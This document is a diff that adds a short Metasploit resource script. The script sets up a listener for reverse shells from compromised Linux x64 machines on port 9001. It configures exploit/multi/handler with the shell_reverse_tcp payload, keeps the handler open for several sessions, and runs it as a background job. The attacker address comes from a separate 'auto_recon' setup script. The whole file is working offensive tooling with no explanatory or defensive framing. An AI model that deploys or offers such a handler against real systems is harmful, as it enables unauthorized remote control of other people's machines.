@@ -1,0 +1,11 @@
+# Linux Reverse Shell Handler
+# Port: 9001
+# Requires: LHOST set globally via setup_msf_from_auto_recon.sh
+
+use exploit/multi/handler
+set PAYLOAD linux/x64/shell_reverse_tcp
+set LPORT 9001
+set ExitOnSession false
+
+echo "[*] Starting Linux x64 shell handler on ${LHOST}:9001"
+run -j
